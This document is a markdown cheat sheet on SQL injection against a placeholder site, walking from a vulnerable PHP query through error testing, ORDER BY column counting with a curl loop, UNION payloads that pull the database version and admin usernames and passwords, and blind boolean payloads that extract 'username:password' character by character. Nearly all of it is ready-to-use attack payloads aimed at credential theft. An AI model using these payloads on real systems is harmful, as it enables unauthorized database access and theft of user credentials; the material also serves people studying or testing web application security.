# SQL Injection

## Basic Example
The following URL serves a page based on the ID number passed to it in the URL.

`https://website.com/pages?id=3`

For an SQL injection to work, this URL needs to be mishandled on the backend. Similar to this:

```
<?php
$id = $_GET['id'];
$query = "SELECT title, content FROM Pages WHERE id == $id;"
```

## Basic Test
The easiest way to test for an SQL injection vulnerability is to throw a `'` into the string. If the application is vulnerable you will see an error similar to:

```
You have an error in your SQL syntax; check the manual that corresponds t oyour MySQL server version for the right.."
```


## Enumerate the columns in the database
Use the `ORDER BY` statement to uncover the number of columns in a table. 

```
x=1
limit=10
while [ $x -le $limit ]
do
    curl https://website.com/pages?id=3 order by $x/*
done
```

At a certain point you will see the error: `(Unkown column '5' in 'order clause')` which will indicate that you have hit the maximum of 4 columns. 

## Test the UNION function
Make sure to test both methods of commenting if one does not work.

`https://website.com/pages?id=3 union all select 1,2,3,4/*`

`https://website.com/pages?id=3 union all select 1,2,3,4--`

## Get SQL Version Number
This will help us determine if we can exploit this version of SQL

`https://website.com/pages?id=3 union all select 1,2,@@version,4/*`


## Enumerate Tables & Columns (version < 5.0)
Pass column names into the query string to attempt to find usernames and passwords.

```
https://website.com/pages?id=3 union all select 1,2,username,4 from admin/*
https://website.com/pages?id=3 union all select 1,2,password,4 from admin/*
```

## Blind Testing
`https://website.com/pages?id=3 and 1=1`

`https://website.com/pages?id=3 and 1=2`

### Get Version
Change the version number (5) as needed 

`https://website.com/pages?id=3 and substring(@@version,1,1)=5`

### Subselect Testing
If the page does not throw an error, the statement will work.

`https://website.com/pages?id=3 and (select 1)=1`

To access the user

`https://website.com/pages?id=3 and (select 1 from mysql.user limit 0,1)=1`


### Checking table names
`https://website.com/pages?id=3 and (select 1 from users limit 0,1)=1`


### Checking column names
`https://website.com/pages?id=3 and (select substring(concat(1,password),1,1) from users limit 0,1)=1`

### Exploiting the vulnerability
This query will retrieve a single string (username:password) from the database, take the first character and convert it to it's ascii code. You will want to increase the index of the character in order to enumerate the entire username and password.

`https://website.com/pages?id=3 and ascii(substring((select concat(username,0x3a,password) from users limit 0,1),1,1)) > 80

`ascii()` - return the ascii character code

`substring(username:password, 1,1)` - return the first character in the user:pass string

`concat(username, 0x3a, password)` - concat username:password

`> 80` - Execute Select query if the ascii character code > 80









 
